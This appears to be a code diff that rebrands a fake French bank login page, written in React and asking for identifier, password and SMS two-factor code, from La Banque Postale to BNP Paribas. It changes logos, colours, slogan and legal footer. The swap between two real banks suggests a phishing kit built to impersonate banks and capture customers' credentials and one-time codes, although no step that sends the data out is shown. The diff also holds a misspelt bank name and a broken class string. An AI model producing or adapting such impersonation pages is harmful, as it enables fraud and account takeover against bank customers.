@@ -46,8 +46,8 @@ function IndicateurCode({ longueur, total }: { longueur: number; total: number }
           key={i}
           className="w-4 h-4 rounded-full border-2 transition-all"
           style={{
-            background: i < longueur ? '#003189' : 'white',
-            borderColor: i < longueur ? '#003189' : '#d1d5db',
+            background: i < longueur ? '#007A53' : 'white',
+            borderColor: i < longueur ? '#007A53' : '#d1d5db',
           }}
         />
       ))}
@@ -60,7 +60,7 @@ function PanneauDroit() {
     <div
       className="hidden lg:flex flex-col justify-between p-12 text-white relative overflow-hidden"
       style={{
-        background: 'linear-gradient(135deg, #003189 0%, #0050c8 50%, #1a6fd4 100%)',
+        background: 'linear-gradient(135deg, #007A53 0%, #009966 50%, #00B37A 100%)',
       }}
     >
       {/* Cercles décoratifs */}
@@ -71,8 +71,8 @@ function PanneauDroit() {
 
       <div className="relative z-10">
         <h2 className="text-3xl font-bold leading-tight mb-3">
-          La Banque Postale,{' '}
-          <span style={{ color: '#7dd3fc' }}>citoyenne</span>
+          BNP Parisbas,{' '}
+          <span style={{ color: '#7EE8B5' }}>La banque d'un monde qui change</span>
         </h2>
         <p className="text-blue-100 text-sm leading-relaxed max-w-xs">
           Parce que nous croyons qu'une banque doit agir pour la
@@ -170,16 +170,16 @@ export default function LoginPage() {
       {/* Header logo */}
       <div className="mb-8">
         <div className="flex items-center gap-2 mb-1">
-        <p className='w-15 h-11'><img src="https://upload.wikimedia.org/wikipedia/fr/thumb/d/d4/Logo_La_Banque_postale_2022.svg/1280px-Logo_La_Banque_postale_2022.svg.png" alt="" /></p>
+        <p className='w-15 h-11'><img src="https://images.icon-icons.com/2699/PNG/512/bnpparibas_logo_icon_168503.png" alt="" /></p>
           <span className="font-bold text-gray-900 text-lg tracking-tight">
-            LA BANQUE POSTALE
+            BNP PARIBAS
           </span>
         </div>
       </div>
       {children}
       {/* Footer */}
       <p className="text-xs text-gray-400 mt-8 text-center lg:text-left">
-        La Banque Postale · SA a Directoire et Conseil de Surveillance
+        BNP PARIBAS · SA a Directoire et Conseil de Surveillance
       </p>
     </div>
   )
@@ -197,7 +197,7 @@ export default function LoginPage() {
           </div>
           <div className="flex items-center gap-2 bg-blue-50 border border-blue-100 rounded-lg px-3 py-2 mb-5">
             <Shield size={15} className="text-[#003189] flex-shrink-0" />
-            <p className="text-xs text-[#003189]">
+            <p className="text-xs text-[#007A53]">
               Saisissez le code recu par SMS
             </p>
           </div>
@@ -213,7 +213,7 @@ export default function LoginPage() {
                 placeholder="• • • • • •"
                 value={code2fa}
                 onChange={(e) => setCode2fa(e.target.value.replace(/\D/g, ''))}
-                className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-center text-2xl font-mono tracking-widest focus:outline-none focus:border-[#003189] transition-colors"
+                className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-center text-2xl font-mono tracking-widest focus:outline-none focus:border-[#007A53]transition-colors"
               />
             </div>
             {error && (
@@ -297,7 +297,7 @@ export default function LoginPage() {
             type="button"
             onClick={() => { setEtape('identifiant'); setPassword(''); setError('') }}
             className="w-full text-sm text-center mt-3"
-            style={{ color: '#003189' }}
+            style={{ color: '#007A53' }}
           >
             Mot de passe oublie ?
           </button>
@@ -347,7 +347,7 @@ export default function LoginPage() {
               type="button"
               onClick={() => setMemoriser(!memoriser)}
               className="w-11 h-6 rounded-full transition-colors flex items-center px-0.5"
-              style={{ background: memoriser ? '#003189' : '#e5e7eb' }}
+              style={{ background: memoriser ? '#007A53' : '#e5e7eb' }}
             >
               <span
                 className="w-5 h-5 bg-white rounded-full shadow transition-transform"
@@ -366,7 +366,7 @@ export default function LoginPage() {
             type="submit"
             disabled={identifiant.length !== 10}
             className="w-full text-white font-semibold py-3 rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-            style={{ background: '#003189' }}
+            style={{ background: '#007A53' }}
           >
             Continuer
           </button>
